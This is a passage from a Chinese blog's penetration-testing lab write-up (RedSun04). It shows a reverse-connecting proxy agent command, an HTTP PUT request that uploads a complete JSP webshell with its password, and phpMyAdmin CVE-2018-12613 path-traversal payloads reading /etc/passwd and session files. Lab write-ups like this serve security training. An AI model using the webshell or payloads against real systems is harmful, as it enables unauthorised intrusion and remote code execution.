+<li><h6 id="使用agent-搭建代理"><a href="#使用agent-搭建代理" class="headerlink" title="使用agent 搭建代理"></a>使用agent 搭建代理</h6><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170803792.png" srcset="/img/loading.gif" lazyload alt="image-20240219170803792"></p>
+<p>上传agent</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170948862.png" srcset="/img/loading.gif" lazyload alt="image-20240219170948862"></p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">./agent -c <span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>:<span class="hljs-number">20090</span> -s hack <span class="hljs-meta">&amp; </span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171121706.png" srcset="/img/loading.gif" lazyload alt="image-20240219171121706"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171323455.png" srcset="/img/loading.gif" lazyload alt="image-20240219171323455"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171403189.png" srcset="/img/loading.gif" lazyload alt="image-20240219171403189"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171429285.png" srcset="/img/loading.gif" lazyload alt="image-20240219171429285"></p>
+</li>
+<li><p>针对2002</p>
+<p>直接使用xray 扫描</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220140917323.png" srcset="/img/loading.gif" lazyload alt="image-20240220140917323"></p>
+<p>尝试利用</p>
+<p>这个由于没有禁用put 和get 可以任意上传</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220141315331.png" srcset="/img/loading.gif" lazyload alt="image-20240220141315331"></p>
+<p>尝试上传webshell</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/1.jsp/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:2002<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>5<br><br><span class="language-haxe">&lt;%-- 使用时请删除此行, 连接密码: <span class="hljs-type">cmd --</span>%&gt;</span><br><span class="language-haxe">  &lt;%! <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CHILD</span> <span class="hljs-keyword"><span class="hljs-keyword">extends</span> <span class="hljs-type">ClassLoader</span></span></span>&#123; CHILD(ClassLoader c)&#123;<span class="hljs-keyword">super</span>(c);&#125; <span class="hljs-keyword">public</span> Class compilation(byte[] b)&#123; <span class="hljs-keyword">return</span></span><br><span class="language-haxe">    <span class="hljs-keyword">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length); &#125; &#125; <span class="hljs-keyword">public</span> byte[] printed(<span class="hljs-keyword">String</span> str) throws Exception &#123; Class base64; byte[]</span><br><span class="language-haxe">    value=<span class="hljs-literal">null</span>; <span class="hljs-keyword">try</span> &#123; base64=Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>); Object decoder=base64.<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();</span><br><span class="language-haxe">    value=(byte[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123;<span class="hljs-keyword">String</span>.<span class="hljs-class"><span class="hljs-keyword">class</span> &#125;).<span class="hljs-title">invoke</span>(<span class="hljs-title">decoder</span>, <span class="hljs-title">new</span> <span class="hljs-title">Object</span>[]</span></span><br><span class="hljs-class"><span class="language-haxe">    </span>&#123; str &#125;); &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123; <span class="hljs-keyword">try</span> &#123; base64=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>); Object</span><br><span class="language-haxe">    decoder=base64.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);</span><br><span class="language-haxe">    value=(byte[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[] &#123; <span class="hljs-keyword">String</span>.<span class="hljs-class"><span class="hljs-keyword">class</span> &#125;).<span class="hljs-title">invoke</span>(<span class="hljs-title">decoder</span>, <span class="hljs-title">new</span> <span class="hljs-title">Object</span>[] </span>&#123;</span><br><span class="language-haxe">    str &#125;); &#125; <span class="hljs-keyword">catch</span> (Exception ee) &#123;&#125; &#125; <span class="hljs-keyword">return</span> value; &#125; %&gt;</span><br><span class="language-haxe">    &lt;% <span class="hljs-keyword">String</span> cls=request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>); <span class="hljs-keyword">if</span> (cls !=<span class="hljs-literal">null</span>) &#123; <span class="hljs-keyword">new</span><span class="hljs-type"></span></span><br><span class="language-haxe">      CHILD(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).compilation(printed(cls)).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>().equals(<span class="hljs-keyword">new</span><span class="hljs-type"></span></span><br><span class="language-haxe">      Object[]&#123;request,response&#125;); &#125; %&gt;</span><br><span class="language-haxe"></span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220141649386.png" srcset="/img/loading.gif" lazyload alt="image-20240220141649386"></p>
+<p>使用蚁剑连接</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220141838686.png" srcset="/img/loading.gif" lazyload alt="image-20240220141838686"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220142002980.png" srcset="/img/loading.gif" lazyload alt="image-20240220142002980"></p>
+</li>
+<li><p>针对2003</p>
+<p>使用xray 扫描一下</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220142402812.png" srcset="/img/loading.gif" lazyload alt="image-20240220142402812"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220142415888.png" srcset="/img/loading.gif" lazyload alt="image-20240220142415888"></p>
+<p>发现ssrf，这个就可以访问任意文件，尝试使用这个日志反弹shell</p>
+<p>创建一个临时表</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220145946228.png" srcset="/img/loading.gif" lazyload alt="image-20240220145946228"></p>
+<p>查看是否开启慢日志记录功能</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow%&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220150104814.png" srcset="/img/loading.gif" lazyload alt="image-20240220150104814"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220150657811.png" srcset="/img/loading.gif" lazyload alt="image-20240220150657811"></p>
+<p>发现这个方式不太行</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220150812337.png" srcset="/img/loading.gif" lazyload alt="image-20240220150812337"></p>
+<p>通过版本搜索漏洞</p>
+<p>发现CVE-2018-12613</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105780497">phpMyAdmin 4.8.1后台文件包含漏洞（CVE-2018-12613）_phpmyadmin4.8.1漏洞-CSDN博客</a></p>
+</blockquote>
+<p>尝试利用</p>
+<p>插入phpnifo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO rce(code) VALUES(&quot;&lt;?php phpinfo(); ?&gt;&quot;);<br></code></pre></td></tr></table></figure>
+
+<p>查看phpinfo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ‘&lt;?php phpinfo() ?&gt;’<br></code></pre></td></tr></table></figure>
+
+<p>查看cookie 值</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220152825162.png" srcset="/img/loading.gif" lazyload alt="image-20240220152825162"></p>
+<p>访问</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_datadict.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>phpStudy<span class="hljs-regexp">/PHPTutorial/</span>tmp<span class="hljs-regexp">/tmp/</span>sess_d57001799c2f03f16958890eb7fff4b1<br><br></code></pre></td></tr></table></figure>
+
+<p>未能成功实现</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220154257905.png" srcset="/img/loading.gif" lazyload alt="image-20240220154257905"></p>
+<p>按道理这一步会执行这个代码</p>
+</li>
+</ol>
+<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><ol>
+<li><p>ip 收集</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219173620934.png" srcset="/img/loading.gif" lazyload alt="image-20240219173620934"></p>
+<p>发现ifconfig 不行</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ip addr</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219173908310.png" srcset="/img/loading.gif" lazyload alt="image-20240219173908310"></p>
+<p>发现没192.168.79.161 的ip </p>
+<p>正常的</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219174931042.png" srcset="/img/loading.gif" lazyload alt="image-20240219174931042"></p>
+<p>可能是docker</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219175133036.png" srcset="/img/loading.gif" lazyload alt="image-20240219175133036"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219175251544.png" srcset="/img/loading.gif" lazyload alt="image-20240219175251544"></p>
+<p>发现这个是docker </p>
+<p>尝试docker 逃逸</p>
+<blockquote>
+</blockquote>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/">#靶场记录</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>RedSun04</div>
+      <div>https://tsy244.github.io/2024/02/19/靶场记录/RedSun04/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 19, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/19/%E6%B8%97%E9%80%8F/docker%E9%80%83%E9%80%B8/" title="docker逃逸">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">docker逃逸</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/19/%E6%95%B4%E7%90%86/cs%E4%B8%8A%E7%BA%BFlinux/" title="cs上线linux">
+                        <span class="hidden-mobile">cs上线linux</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
